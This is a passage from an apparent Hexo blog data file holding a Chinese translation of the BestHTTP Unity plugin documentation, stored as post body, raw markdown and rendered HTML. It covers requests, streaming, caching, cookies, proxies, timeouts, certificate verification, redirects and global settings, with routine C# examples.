Org.BouncyCastle.Crypto.Tls; \n        using Org.BouncyCastle.Asn1.X509; \n        class CustomVerifier : ICertificateVerifyer \n        { \n                public bool IsValid(Uri serverUri, X509CertificateStructure[] certs) \n                { \n                // TODO: Return false, if validation fails return true; \n                } \n        } \n        var request = new HTTPRequest(new Uri(\"https://google.com\"), ...);\n        request.CustomCertificateVerifyer = new CustomVerifier(); \n        request.UseAlternateSSL = true; \n        request.Send(); \n\n\n```\n\n\n* 16:控制重定向,Control Redirections ,重定向由插件自动处理，但有时我们必须在向我们重定向到的uri发出新请求之前进行更改。我们可以在HTTPRequest的OnBeforeRedirection事件处理程序中进行这些更改。在插件向新uri发出新请求之前调用此事件。函数的返回值将控制重定向：如果为false，则重定向将被中止,子线程中调用\n\n\n```\n        var request = new HTTPRequest(uri, HTTPMethods.Post); \n        request.AddField(\"field\", \"data\"); \n        request.OnBeforeRedirection += OnBeforeRedirect; \n        request.Send(); \n        bool OnBeforeRedirect(HTTPRequest req, HTTPResponse resp, Uri redirectUri) \n        { \n                if (req.MethodType == HTTPMethods.Post && resp.StatusCode == 302) \n                { \n                        req.MethodType = HTTPMethods.Get; \n                        // Don't send more data than needed. \n                        // So we will delete our already processed form data.\n                        req.Clear(); \n                } \n                return true; \n        } \n```\n\n\n* 17:统计(Statistics),您可以使用HTTPManager.GetGeneralStatistics函数获取有关底层插件的一些统计信息：\n\n\n```\n        GeneralStatistics stats = HTTPManager.GetGeneralStatistics(StatisticsQueryFlags.All); Debug.Log(stats.ActiveConnections); \n\n```\n>>>\n        1):Connections：将返回基于连接的统计信息。这些是以下内容：\n                A:RequestsInQueue：队列中等待空闲连接的请求数。\n                B:Connections：插件跟踪的HTTPConnection实例数。这是以下所有连接的总和\n                B:ActiveConnections：活动连接数。这些连接当前正在处理请求。\n                C:FreeConnections：免费连接数。这些连接完成了请求，他们正在等待另一个请求或回收。\n                D:RecycledConnections：回收连接数。这些连接将尽快删除。\n        2):Cache：基于缓存的统计信息这些是以下内容：\n                A:CacheEntityCount：缓存响应的数量。\n                B:CacheSize：缓存响应的总和大小\n        3):Cookie：基于Cookie的统计信息。这些是以下内容\n                A:CookieCount：Cookie Jar中的Cookie数量\n                B:CookieJarSize：Cookie Jar中Cookie的总和大小\n>>>\n\n\n## Global Settings \n* 1:使用以下属性，我们可以更改一些默认值，否则应在HTTPRequest的构造函数中指定。因此，大多数这些属性都是节省时间的快捷方式。\n* 2:这些更改将影响其值更改后创建的所有请求。可以通过HTTPManager类的静态属性更改默认值:\n\n>>>\n        1):MaxConnectionPerServer：允许唯一主机的连接数。 http://example.org和https://example.org被视为两个独立的服务器。默认值为4。\n        2):KeepAliveDefaultValue：HTTPRequest的IsKeepAlive属性的默认值。如果IsKeepAlive为false，则将在每个请求之前设置与服务器的tcp连接，并在其之后立即关闭。如果连续请求很少，则应将其更改为false。赋予HTTPRequest构造函数的值将仅覆盖此请求的此值。默认值是true。\n        3):IsCachingDisabled：使用此属性，我们可以全局禁用或启用缓存服务。赋予HTTPRequest构造函数的值将仅覆盖此请求的此值。默认值是true。\n        4):MaxConnectionIdleTime：指定BestHTTP在完成最后一次请求后销毁连接之前应等待的空闲时间。默认值为2分钟。\n        5):IsCookiesEnabled：使用此选项，可以启用或禁用所有Cookie操作。默认值是true。\n        6):CookieJarSize：使用此选项可以控制Cookie存储的大小。默认值为10485760（10 MB）.\n        7):EnablePrivateBrowsing：如果启用此选项，则不会将Cookie写入磁盘。默认值为false\n        8):ConnectTimeout：使用此选项，您可以设置HTTPRequests的默认ConnectTimeout值。默认值为20秒。\n        9):RequestTimeout：使用此选项，您可以设置HTTPRequests.Timeout的默认超时值。默认值为60秒。\n        10):RootCacheFolderProvider：默认情况下，插件会将所有缓存和cookie数据保存在Application.persistentDataPath返回的路径下。您可以为此委托指定一个函数，以返回自定义根路径以定义新路径。这个代理将在子线程上调用！\n        11):Proxy：所有HTTPRequests的全局默认代理。 HTTPRequest的代理仍然可以按请求进行更改。默认值为null\n        12):Logger：ILogger实现，能够控制将记录有关插件内部的信息，以及如何记录这些信息\n        13):DefaultCertificateVerifyer：可以将ICertificateVerifyer实现设置为此属性。之后创建的所有新请求将在使用安全协议且请求的UseAlternateSSL为true时使用此验证程序。 ICertificateVerifyer实现可用于实现服务器证书验证。\n        14):UseAlternateSSLDefaultValue：可以通过此属性更改HTTPRequest的UseAlternateSSL的默认值。\n        15):HTTPManager.MaxConnectionPerServer = 10; HTTPManager.RequestTimeout = TimeSpan.FromSeconds(120); \n>>>\n\n\n## 关于线程\n* 1:因为插件内部使用线程并行处理所有请求，所以所有共享资源（缓存，cookie等）都是在设计和实现线程安全时考虑的。\n* 2:调用请求的回调函数和所有其他回调（如WebSocket的回调）都是在Unity的主线程上回调（如Unity的事件：awake, start, update, etc），因此您不必进行任何线程同步。\n* 3:在多个线程上创建，发送请求也是安全的，但是你应该调用BestHTTP.HTTPManager.Setup();在从Unity的一个事件（例如，awake，start）发送任何请求之前发挥作用。","source":"_posts/Unity/BestHttp/BestHttp介绍.md","raw":"---\ntitle: BestHttp介绍1\ndate: 2020-05-11 11:41:32\ncategories:\n- Unity\ntags:\n- BestHttp\n---\n\n# BestHttp 文档翻译\n\n## 介绍\n\n[BestHTTP](https://www.assetstore.unity3d.com/en/#!/content/10872) 是基于 [RFC 2616](https://www.w3.org/Protocols/rfc2616/rfc2616.html) 的 HTTP/1.1 实现 , 它支持几乎所有Unity移动和独立平台 (请参阅 [Supported platforms](#15)). \n\n我的目标是为Unity创建一个易于使用但功能强大的插件，以利用HTTP / 1.1中的潜力.    本文档是一个快速指南，并非所有功能和属性都可以在这里找到. 如需支持，功能请求或一般性问题，您可以发送电子邮件至besthttp@gmail.com.\n\n## 快速入门\n\n* 1:使用头文件.本文档中的所有示例都没有任何错误检查！在编写时，请确保添加一些空检查\n\n\n```\n        using BestHTTP;     \n\n```\n\n* 2:GET 请求,向Web服务器发出请求的最简单方法是创建一个HTTPRequest对象，为其构造函数提供url和回调函数.在我们构造一个新的HTTPRequest对象后，我们唯一需要做的就是使用Send()函数发送请求.\n\n```\n\n        {\n                HTTPRequest request = new HTTPRequest(new Uri(\"https://google.com\"), OnRequestFinished); request.Send(); \n\n                new HTTPRequest(new Uri(\"https://google.com\"), (request, response) => Debug.Log(\"Finished!\")).Send(); \n        }\n        void OnRequestFinished(HTTPRequest request, HTTPResponse response) \n        {    \n                Debug.Log(\"Request Finished! Text received: \" + response.DataAsText); \n        }      \n\n```\n\n\n回调函数始终接收原始HTTPRequest对象和保存服务器响应的HTTPResponse对象。如果出现错误，则HTTPResponse对象为null,需要自己判断,并且请求对象具有Exception属性,该属性可能包含有关错误的额外信息(如果有).\n虽然请求总是在不同的线程上处理，但调用回调函数已完成Unity的主线程，所以我们不必做任何线程同步。\n\n* 3:其他请求 上面的例子是简单的GET请求。如果我们没有指定方法，默认情况下所有请求都将是GET请求。构造函数具有另一个参数，可用于指定请求的方法.\n\n\n```     \n        HTTPRequest request = new HTTPRequest(new Uri(\"http://server.com/path\"), HTTPMethods.Post, OnRequestFinished); \n        request.AddField(\"FieldName\", \"Field Value\"); \n        request.Send();         \n\n```\n\n\n要在不设置字段的情况下POST任何数据，可以使用RawData属性\n\n\n\n```\n        HTTPRequest request = new HTTPRequest(new Uri(\"http://server.com/path\"), HTTPMethods.Post, OnRequestFinished); \n        request.RawData =  Encoding.UTF8.GetBytes(\"Field Value\"); \n        request.Send();         \n\n```\n\n有关其他样品，请查看[Small Code-Samples](#14)部分。\n\n除了GET和POST之外，您还可以使用 ***HEAD，PUT，DELETE，PATCH***  方法:\n\n\n```     \n        HTTPRequest request = new HTTPRequest(new Uri(\"http://server.com/path\"), HTTPMethods.Head, OnRequestFinished); \n        request.Send(); \n\n        HTTPRequest request = new HTTPRequest(new Uri(\"http://server.com/path\"), HTTPMethods.Put, OnRequestFinished); \n        request.Send(); \n\n        HTTPRequest request = new HTTPRequest(new Uri(\"http://server.com/path\"), HTTPMethods.Delete, OnRequestFinished); \n        request.Send(); \n\n        HTTPRequest request = new HTTPRequest(new Uri(\"http://server.com/path\"), HTTPMethods.Patch, OnRequestFinished); \n        request.Send(); \n\n```\n\n\n* 4:如何使用下载的数据?可以从HTTPResponse对象的Data属性访问原始字节。我们来看一个如何下载图像的例子:\n\n```\n        new HTTPRequest(new Uri(\"http://yourserver.com/path/to/image.png\"), (request, response) => \n                { \n                        var tex = new Texture2D(0, 0); \n                        tex.LoadImage(response.Data); \n                        guiTexture.texture = tex; \n                }).Send(); \n\n        new HTTPRequest(new Uri(\"http://yourserver.com/path/to/image.png\"),\n        (request, response) => guiTexture.texture = response.DataAsTexture2D).Send();   \n\n```     \n\n\n除 response.DataAsTexture2D 外，还有一个 response.DataAsText 属性可将响应解码为Utf8字符串。将来可能会添加更多数据解码属性。如果您有任何想法，请自己添加吧.\n\n* 5:替换 WWW,使用协程,一般不推荐使用这种方式\n\n\n```     \n        HTTPRequest request = new HTTPRequest(new Uri(\"http://server.com\"));\n        request.Send(); \n        yield return StartCoroutine(request); \n        Debug.Log(\"Request finished! Downloaded Data:\" + request.Response.DataAsText);  \n\n```\n\n\n\n## 高级用法\n* 1:methodType,我们将向服务器发送什么样的请求。默认的methodType是HTTPMethods.Get\n* 2:IsKeepAlive：向服务器指示我们希望tcp连接保持打开状态，因此连续的http请求不需要再次建立连接。如果我们将它保留为默认值true，它可以为我们节省大量时间。如果我们知道我们不会使用通常会将其设置为false的请求。默认值是true。\n* 3:disableCache：告诉BestHTTP系统使用或完全跳过缓存机制。如果其值为true，则系统不会检查缓存中是否存储了响应，并且也不会保存响应。默认值为false\n* 4:请求一次:\n\n\n```     \n        public static void RequestAsyncShort(string url, RequestCallBack callBack)\n        {\n                BestHTTP.HTTPRequest req = new HTTPRequest(new Uri(url), HTTPMethods.Get, \n                (originalRequest, response) =>\n                {\n                        if (originalRequest.State == HTTPRequestStates.Finished)\n                        {\n                        callBack((int) originalRequest.State, response.DataAsText);\n                        }\n                        else\n                        {\n                        callBack((int) originalRequest.State, \"\");\n                        }\n                });\n                req.IsKeepAlive = false;\n                req.DisableCache = true;\n                req.Send();\n        }           \n\n```\n\n* 5:Best HTTP通过HTTPRequest的Credentials属性支持Basic和Digest身份验证：\n\n\n```\n        using BestHTTP.Authentication; \n        var request = new HTTPRequest(new Uri(\"http://yourserver.org/auth-path\"), (req, resp) => \n                { \n                        if (resp.StatusCode != 401) \n                                Debug.Log(\"Authenticated\"); \n                        else \n                                Debug.Log(\"NOT Authenticated\"); \n                        Debug.Log(resp.DataAsText); \n                }); \n        request.Credentials = new Credentials(\"usr\", \"paswd\"); \n        request.Send();                 \n\n```\n\n\n* 6:下载流媒体(Download Streaming)\n默认情况下，当完全下载并处理服务器的答案时，我们提供给HTTPRequest的构造函数的回调函数将只调用一次。这样，如果我们想要下载更大的文件，我们就会在移动设备上快速耗尽内存。我们的应用程序会崩溃，用户会对我们生气，应用程序会得到很多不好的评级。理所当然。为了避免这种情况，BestHTTP旨在非常容易地处理这个问题：只需将一个标志(属性)切换为true，每次下载预定义数据量时(指定内存中缓存多少字节量)都会调用我们的回调函数。此外，如果我们没有关闭缓存，下载的响应将被缓存，以便下次我们可以从本地缓存流式传输整个响应，而无需更改我们的代码，甚至无需访问Web服务器。 （备注：服务器必须发送有效的缓存头（“Expires”头：请参阅[RFC](https://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.21)以允许此操作。）\n\n\n```     \n        var request = new HTTPRequest(new Uri(\"http://yourserver.com/bigfile\"), (req, resp) => \n        { \n                List<byte[]> fragments = resp.GetStreamedFragments(); \n                // Write out the downloaded data to a file: \n                using (FileStream fs = new FileStream(\"pathToSave\", FileMode.Append)) {\n                        foreach(byte[] data in fragments) fs.Write(data, 0, data.Length); \n                }\n                if (resp.IsStreamingFinished) Debug.Log(\"Download finished!\"); \n        }); \n        request.UseStreaming = true; \n        request.StreamFragmentSize = 1 * 1024 * 1024; // 1 megabyte\n        request.DisableCache = true; // already saving to a file, so turn off caching request.Send(); \n                \n```\n\n\n>>>\n        1):我们将标志 - UseStreaming - 切换为true，因此我们的回调可能被调用多次。\n        2):StreamFragmentSize指示在调用回调之前我们想要在内存中缓冲的最大数据量。\n        3):每次下载StreamFragmentSize大小的块时都会调用我们的回调，并且当IsStreamingFinished设置为true时再调用一次。\n        4):要获取下载的数据，我们必须使用GetStreamedFragments()函数。我们应该将结果保存在临时变量中，因为在此调用中清除了内部缓冲区(返回字节量,清除内存,写入文件)，因此连续调用将为我们提供null结果。\n        5):我们在此示例中禁用了缓存，因为我们已经保存了下载的缓存,保存在一个磁盘文件中，并且我们不想占用太多空间。\n>>>\n\n\n下载进度\n\n\n```\n        var request = new HTTPRequest(new Uri(address), OnFinished); \n        request.OnProgress = OnDownloadProgress; \n        request.Send(); \n        void OnDownloadProgress(HTTPRequest request, int downloaded, int length) \n        { \n                float progressPercent = (downloaded / (float)length) * 100.0f;\n                Debug.Log(\"Downloaded: \" + progressPercent.ToString(\"F2\") + \"%\"); \n        } \n\n```\n\n\n* 7:上传流媒体(Upload Streaming)\n使用HTTPRequest对象的UploadStream属性设置上传的数据流Stream。当上传完成并且DisposeUploadStream为true时，插件将调用Stream流上的Dispose()函数。如果流的长度未知，则UseUploadStreamLength属性应设置为false。在这种情况下，插件将使用分块传输编码从流中发送数据:\n\n\n```\n        var request = new HTTPRequest(new Uri(address), HTTPMethods.Post, OnUploadFinished); \n        request.UploadStream = new FileStream(\"File_To.Upload\", FileMode.Open); \n        request.Send(); \n\n```\n\n\n上传进度回调,要跟踪和显示上传进度，您可以使用HTTPRequest类的OnUploadProgress事件。 OnUploadProgress可以与RawData，表单（通过AddField和AddBinaryData）以及UploadStream一起使用。\n\n\n```\n        var request = new HTTPRequest(new Uri(address), HTTPMethods.Post, OnFinished); \n        request.RawData =  Encoding.UTF8.GetBytes(\"Field Value\");\n        request.OnUploadProgress = OnUploadProgress; \n        request.Send(); \n        void OnUploadProgress(HTTPRequest request, long uploaded, long length)\n        { \n                float progressPercent = (uploaded / (float)length) * 100.0f;\n                Debug.Log(\"Uploaded: \" + progressPercent.ToString(\"F2\") + \"%\"); \n        }\n                \n```\n\n* 8:缓存\n\n缓存也基于HTTP / 1.1 RFC。它使用标头来存储和验证响应。缓存机制在幕后工作，我们唯一要做的就是决定是否要启用或禁用它。如果缓存的响应具有带有未来日期的“Expires”标头，则BestHTTP将使用缓存的响应，而不对服务器进行验证。这意味着我们不必启动与服务器的任何tcp连接。这可以节省我们的时间，带宽和离线工作。 ***(这段话的意思相当于本地数据缓存,请求服务器,不会真的连接服务器,会从本地取出原来已经请求过的数据,只要这个数据没有过期,则直接返回给使用者)***\n\n\n虽然缓存是自动的，但我们可以控制它，或者我们可以使用HTTPCacheService类的公共函数获取一些信息：\n>>>\n        1):BeginClear(),它将开始在单独的线程上清除整个缓存\n        2):BeginMaintainence(),有了这个函数的帮助，我们可以根据上次访问时间删除缓存的条目。它删除上次访问时间早于指定时间的条目。我们还可以使用此函数来控制缓存大小：\n                HTTPCacheService.BeginMaintainence(new HTTPCacheMaintananceParams(TimeSpan.FromDays(14), 50 * 1024 * 1024)); \n        3):GetCacheSize(),将以字节为单位返回缓存的大小。\n        4):GetCacheEntryCount(),将返回缓存中存储的条目数。可以使用float avgSize = GetCacheSize()/（float）GetCacheEntryCount()公式计算平均缓存条目大小。\n>>>\n\n\n* 9:Cookie ,处理cookie操作对程序员来说是透明的。设置请求Cookie标头以及解析和维护响应的Set-Cookie标头由插件自动完成。有很多关于cookie的Global Settings 。有关详细信息，请参阅 [Global Settings](#13) 部分。\n它可以以各种方式控制\n\n>>>\n        1):使用每一次的请求对象HTTPRequest.IsCookiesEnabled属性以及全局的HTTPManager.IsCookiesEnabled属性来禁用\n        2):可以通过调用CookieJar.Clear()函数从Cookie Jar中删除Cookie\n        3):可以通过响应的Cookies属性访问从服务器发送的新cookie。\n>>>\n\n可以通过将Cookie添加到Cookie列表中将Cookie添加到HTTPRequest：\n\n```\n        var request = new HTTPRequest(new Uri(address), OnFinished);\n        request.Cookies.Add(new Cookie(\"Name\", \"Value\")); \n        request.Send(); \n\n```\n\n\n这些cookie将与服务器发送的cookie合并。如果在请求或HTTPManager中将IsCookiesEnabled设置为false，则仅发送这些用户设置的cookie\n\n* 10:代理,HTTPProxy对象可以设置为HTTPRequest的Proxy属性。这样，请求将通过给定的代理。\n\n```\n        request.Proxy = new HTTPProxy(new Uri(\"http://localhost:3128\")); \n\n```\n\n\n您也可以设置全局代理，因此您不必手动将其设置为所有请求。请参阅[Global Settings](#13)一章\n\n* 11:终止请求,您可以通过调用HTTPRequest对象的Abort（）函数来中止正在进行的请求\n\n\n```\n        request = new HTTPRequest(new Uri(\"http://yourserver.com/bigfile\"), (req, resp) => { ... }); \n        request.Send(); \n        // And after some time: \n        request.Abort(); //将调用回调函数，并且响应对象(resp)将为null。\n```\n\n\n* 12:超时,2 种情况,第一种是:ConnectTimeout,使用此属性，您可以控制等待在应用程序和远程服务器之间建立连接的时间。其默认值为20秒\n\n```\n        request = new HTTPRequest(new Uri(\"http://yourserver.com/\"), (req, resp) => { ... }); \n        request.ConnectTimeout = TimeSpan.FromSeconds(2); \n        request.Send(); \n\n```\n第二种:Timeout 使用此属性，您可以控制等待处理请求的时间（此时已连接到服务器,正在等待服务器响应,发送请求和下载响应）。其默认值为60秒。\n\n\n```\n        request = new HTTPRequest(new Uri(\"http://yourserver.com/\"), (req, resp) => { ... }); \n        request.Timeout = TimeSpan.FromSeconds(10); \n        request.Send(); \n\n\n\n        string url = \"http://besthttp.azurewebsites.net/api/LeaderboardTest?from=0&count=10\"; \n        HTTPRequest request = new HTTPRequest(new Uri(url), (req, resp) => \n        { \n                switch (req.State) \n                { \n                        // The request finished without any problem. \n                        case HTTPRequestStates.Finished: \n                                Debug.Log(\"Request Finished Successfully!\\n\" + resp.DataAsText); \n                                break; \n                                // The request finished with an unexpected error. \n                        // The request's Exception property may contain more information about the error. \n                        case HTTPRequestStates.Error: \n                                Debug.LogError(\"Request Finished with Error! \" + (req.Exception != null ? (req.Exception.Message + \"\\n\" + req.Exception.StackTrace) : \"No Exception\")); \n                        break; \n                        // The request aborted, initiated by the user. \n                        case HTTPRequestStates.Aborted: \n                                Debug.LogWarning(\"Request Aborted!\"); \n                        break; \n                        // Ceonnecting to the server timed out. \n                        case HTTPRequestStates.ConnectionTimedOut: \n                                Debug.LogError(\"Connection Timed Out!\"); \n                        break; \n                        // The request didn't finished in the given time. \n                        case HTTPRequestStates.TimedOut: \n                                Debug.LogError(\"Processing the request Timed Out!\"); break; \n                } \n        }); \n        // Very little time, for testing purposes: \n        request.ConnectTimeout = TimeSpan.FromMilliseconds(2); \n        request.Timeout = TimeSpan.FromSeconds(5); \n        request.IsKeepAlive = false; \n        request.DisableCache = true; \n        request.Send(); \n\n```\n\n* 13:Request States 请求状态,所有请求都有一个包含其内部状态的State属性。可能的状态如下：\n\n>>>\n        1):Initial:请求的初始状态。使用此状态不会调用任何回调\n        2):Queued:在队列中等待处理。使用此状态不会调用任何回调\n        3):Processing:开始处理请求。在此状态下，客户端将发送请求，并解析响应。使用此状态不会调用任何回调。\n        4):Finished:请求完成没有问题。解析完成的响应后，可以使用结果。将使用有效的响应对象调用用户定义的回调。请求的Exception属性将为null。\n        5):Error:请求在插件中以意外错误结束。将使用null响应对象调用用户定义的回调。请求的Exception属性可能包含有关错误的更多信息，但它可以为null。\n        6):Aborted: 请求由客户端中止（HTTPRequest的Abort（）函数）。将使用null响应调用用户定义的回调。请求的Exception属性将为null。\n        7):ConnectionTimedOut：连接到服务器超时。将使用null响应调用用户定义的回调。请求的Exception属性将为null。\n        8):TimedOut：请求未在给定时间内完成。将使用null响应调用用户定义的回调。请求的Exception属性将为null。\n>>>\n\n\n* 14:请求的优先级Request Priority ,可以通过HTTPRequest的Priority属性更改请求的优先级。与较低优先级请求相比，将从请求队列中选择更高优先级的请求。\n\n```\n        var request = new HTTPRequest(new Uri(\"https://google.com\"), ...);\n        request.Priority = -1; \n        request.Send(); \n\n```\n\n\n* 15:服务器证书验证,Server Certificate  Validation 可以通过实现ICertificateVerifyer接口并将其设置为HTTPRequest的CustomCertificateVerifyer来验证服务器发送的证书：\n\n\n```\n        using System; \n        using Org.BouncyCastle.Crypto.Tls; \n        using Org.BouncyCastle.Asn1.X509; \n        class CustomVerifier : ICertificateVerifyer \n        { \n                public bool IsValid(Uri serverUri, X509CertificateStructure[] certs) \n                { \n                // TODO: Return false, if validation fails return true; \n                } \n        } \n        var request = new HTTPRequest(new Uri(\"https://google.com\"), ...);\n        request.CustomCertificateVerifyer = new CustomVerifier(); \n        request.UseAlternateSSL = true; \n        request.Send(); \n\n\n```\n\n\n* 16:控制重定向,Control Redirections ,重定向由插件自动处理，但有时我们必须在向我们重定向到的uri发出新请求之前进行更改。我们可以在HTTPRequest的OnBeforeRedirection事件处理程序中进行这些更改。在插件向新uri发出新请求之前调用此事件。函数的返回值将控制重定向：如果为false，则重定向将被中止,子线程中调用\n\n\n```\n        var request = new HTTPRequest(uri, HTTPMethods.Post); \n        request.AddField(\"field\", \"data\"); \n        request.OnBeforeRedirection += OnBeforeRedirect; \n        request.Send(); \n        bool OnBeforeRedirect(HTTPRequest req, HTTPResponse resp, Uri redirectUri) \n        { \n                if (req.MethodType == HTTPMethods.Post && resp.StatusCode == 302) \n                { \n                        req.MethodType = HTTPMethods.Get; \n                        // Don't send more data than needed. \n                        // So we will delete our already processed form data.\n                        req.Clear(); \n                } \n                return true; \n        } \n```\n\n\n* 17:统计(Statistics),您可以使用HTTPManager.GetGeneralStatistics函数获取有关底层插件的一些统计信息：\n\n\n```\n        GeneralStatistics stats = HTTPManager.GetGeneralStatistics(StatisticsQueryFlags.All); Debug.Log(stats.ActiveConnections); \n\n```\n>>>\n        1):Connections：将返回基于连接的统计信息。这些是以下内容：\n                A:RequestsInQueue：队列中等待空闲连接的请求数。\n                B:Connections：插件跟踪的HTTPConnection实例数。这是以下所有连接的总和\n                B:ActiveConnections：活动连接数。这些连接当前正在处理请求。\n                C:FreeConnections：免费连接数。这些连接完成了请求，他们正在等待另一个请求或回收。\n                D:RecycledConnections：回收连接数。这些连接将尽快删除。\n        2):Cache：基于缓存的统计信息这些是以下内容：\n                A:CacheEntityCount：缓存响应的数量。\n                B:CacheSize：缓存响应的总和大小\n        3):Cookie：基于Cookie的统计信息。这些是以下内容\n                A:CookieCount：Cookie Jar中的Cookie数量\n                B:CookieJarSize：Cookie Jar中Cookie的总和大小\n>>>\n\n\n## Global Settings \n* 1:使用以下属性，我们可以更改一些默认值，否则应在HTTPRequest的构造函数中指定。因此，大多数这些属性都是节省时间的快捷方式。\n* 2:这些更改将影响其值更改后创建的所有请求。可以通过HTTPManager类的静态属性更改默认值:\n\n>>>\n        1):MaxConnectionPerServer：允许唯一主机的连接数。 http://example.org和https://example.org被视为两个独立的服务器。默认值为4。\n        2):KeepAliveDefaultValue：HTTPRequest的IsKeepAlive属性的默认值。如果IsKeepAlive为false，则将在每个请求之前设置与服务器的tcp连接，并在其之后立即关闭。如果连续请求很少，则应将其更改为false。赋予HTTPRequest构造函数的值将仅覆盖此请求的此值。默认值是true。\n        3):IsCachingDisabled：使用此属性，我们可以全局禁用或启用缓存服务。赋予HTTPRequest构造函数的值将仅覆盖此请求的此值。默认值是true。\n        4):MaxConnectionIdleTime：指定BestHTTP在完成最后一次请求后销毁连接之前应等待的空闲时间。默认值为2分钟。\n        5):IsCookiesEnabled：使用此选项，可以启用或禁用所有Cookie操作。默认值是true。\n        6):CookieJarSize：使用此选项可以控制Cookie存储的大小。默认值为10485760（10 MB）.\n        7):EnablePrivateBrowsing：如果启用此选项，则不会将Cookie写入磁盘。默认值为false\n        8):ConnectTimeout：使用此选项，您可以设置HTTPRequests的默认ConnectTimeout值。默认值为20秒。\n        9):RequestTimeout：使用此选项，您可以设置HTTPRequests.Timeout的默认超时值。默认值为60秒。\n        10):RootCacheFolderProvider：默认情况下，插件会将所有缓存和cookie数据保存在Application.persistentDataPath返回的路径下。您可以为此委托指定一个函数，以返回自定义根路径以定义新路径。这个代理将在子线程上调用！\n        11):Proxy：所有HTTPRequests的全局默认代理。 HTTPRequest的代理仍然可以按请求进行更改。默认值为null\n        12):Logger：ILogger实现，能够控制将记录有关插件内部的信息，以及如何记录这些信息\n        13):DefaultCertificateVerifyer：可以将ICertificateVerifyer实现设置为此属性。之后创建的所有新请求将在使用安全协议且请求的UseAlternateSSL为true时使用此验证程序。 ICertificateVerifyer实现可用于实现服务器证书验证。\n        14):UseAlternateSSLDefaultValue：可以通过此属性更改HTTPRequest的UseAlternateSSL的默认值。\n        15):HTTPManager.MaxConnectionPerServer = 10; HTTPManager.RequestTimeout = TimeSpan.FromSeconds(120); \n>>>\n\n\n## 关于线程\n* 1:因为插件内部使用线程并行处理所有请求，所以所有共享资源（缓存，cookie等）都是在设计和实现线程安全时考虑的。\n* 2:调用请求的回调函数和所有其他回调（如WebSocket的回调）都是在Unity的主线程上回调（如Unity的事件：awake, start, update, etc），因此您不必进行任何线程同步。\n* 3:在多个线程上创建，发送请求也是安全的，但是你应该调用BestHTTP.HTTPManager.Setup();在从Unity的一个事件（例如，awake，start）发送任何请求之前发挥作用。","slug":"Unity/BestHttp/BestHttp介绍","published":1,"updated":"2020-05-12T02:42:41.567Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8czq002k2gk7edza57oy","content":"<h1 id=\"BestHttp-文档翻译\"><a href=\"#BestHttp-文档翻译\" class=\"headerlink\" title=\"BestHttp 文档翻译\"></a>BestHttp 文档翻译</h1><h2 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h2><p><a href=\"https://www.assetstore.unity3d.com/en/#!/content/10872\" target=\"_blank\" rel=\"noopener\">BestHTTP</a> 是基于 <a href=\"https://www.w3.org/Protocols/rfc2616/rfc2616.html\" target=\"_blank\" rel=\"noopener\">RFC 2616</a> 的 HTTP/1.1 实现 , 它支持几乎所有Unity移动和独立平台 (请参阅 <a href=\"#15\">Supported platforms</a>). </p>\n<p>我的目标是为Unity创建一个易于使用但功能强大的插件，以利用HTTP / 1.1中的潜力.    本文档是一个快速指南，并非所有功能和属性都可以在这里找到. 如需支持，功能请求或一般性问题，您可以发送电子邮件至<a href=\"mailto:besthttp@gmail.com\">besthttp@gmail.com</a>.</p>\n<h2 id=\"快速入门\"><a href=\"#快速入门\" class=\"headerlink\" title=\"快速入门\"></a>快速入门</h2><ul>\n<li>1:使用头文件.本文档中的所有示例都没有任何错误检查！在编写时，请确保添加一些空检查</li>\n</ul>\n<pre><code>        using BestHTTP;     \n</code></pre><ul>\n<li>2:GET 请求,向Web服务器发出请求的最简单方法是创建一个HTTPRequest对象，为其构造函数提供url和回调函数.在我们构造一个新的HTTPRequest对象后，我们唯一需要做的就是使用Send()函数发送请求.</li>\n</ul>\n<pre><code>\n        {\n                HTTPRequest request = new HTTPRequest(new Uri(&quot;https://google.com&quot;), OnRequestFinished); request.Send(); \n\n                new HTTPRequest(new Uri(&quot;https://google.com&quot;), (request, response) =&gt; Debug.Log(&quot;Finished!&quot;)).Send(); \n        }\n        void OnRequestFinished(HTTPRequest request, HTTPResponse response) \n        {    \n                Debug.Log(&quot;Request Finished! Text received: &quot; + response.DataAsText); \n        }      \n</code></pre><p>回调函数始终接收原始HTTPRequest对象和保存服务器响应的HTTPResponse对象。如果出现错误，则HTTPResponse对象为null,需要自己判断,并且请求对象具有Exception属性,该属性可能包含有关错误的额外信息(如果有).<br>虽然请求总是在不同的线程上处理，但调用回调函数已完成Unity的主线程，所以我们不必做任何线程同步。</p>\n<ul>\n<li>3:其他请求 上面的例子是简单的GET请求。如果我们没有指定方法，默认情况下所有请求都将是GET请求。构造函数具有另一个参数，可用于指定请求的方法.</li>\n</ul>\n<pre><code>        HTTPRequest request = new HTTPRequest(new Uri(&quot;http://server.com/path&quot;), HTTPMethods.Post, OnRequestFinished); \n        request.AddField(&quot;FieldName&quot;, &quot;Field Value&quot;); \n        request.Send();         \n</code></pre><p>要在不设置字段的情况下POST任何数据，可以使用RawData属性</p>\n<pre><code>        HTTPRequest request = new HTTPRequest(new Uri(&quot;http://server.com/path&quot;), HTTPMethods.Post, OnRequestFinished); \n        request.RawData =  Encoding.UTF8.GetBytes(&quot;Field Value&quot;); \n        request.Send();         \n</code></pre><p>有关其他样品，请查看<a href=\"#14\">Small Code-Samples</a>部分。</p>\n<p>除了GET和POST之外，您还可以使用 <strong><em>HEAD，PUT，DELETE，PATCH</em></strong>  方法:</p>\n<pre><code>        HTTPRequest request = new HTTPRequest(new Uri(&quot;http://server.com/path&quot;), HTTPMethods.Head, OnRequestFinished); \n        request.Send(); \n\n        HTTPRequest request = new HTTPRequest(new Uri(&quot;http://server.com/path&quot;), HTTPMethods.Put, OnRequestFinished); \n        request.Send(); \n\n        HTTPRequest request = new HTTPRequest(new Uri(&quot;http://server.com/path&quot;), HTTPMethods.Delete, OnRequestFinished); \n        request.Send(); \n\n        HTTPRequest request = new HTTPRequest(new Uri(&quot;http://server.com/path&quot;), HTTPMethods.Patch, OnRequestFinished); \n        request.Send(); \n</code></pre><ul>\n<li>4:如何使用下载的数据?可以从HTTPResponse对象的Data属性访问原始字节。我们来看一个如何下载图像的例子:</li>\n</ul>\n<pre><code>        new HTTPRequest(new Uri(&quot;http://yourserver.com/path/to/image.png&quot;), (request, response) =&gt; \n                { \n                        var tex = new Texture2D(0, 0); \n                        tex.LoadImage(response.Data); \n                        guiTexture.texture = tex; \n                }).Send(); \n\n        new HTTPRequest(new Uri(&quot;http://yourserver.com/path/to/image.png&quot;),\n        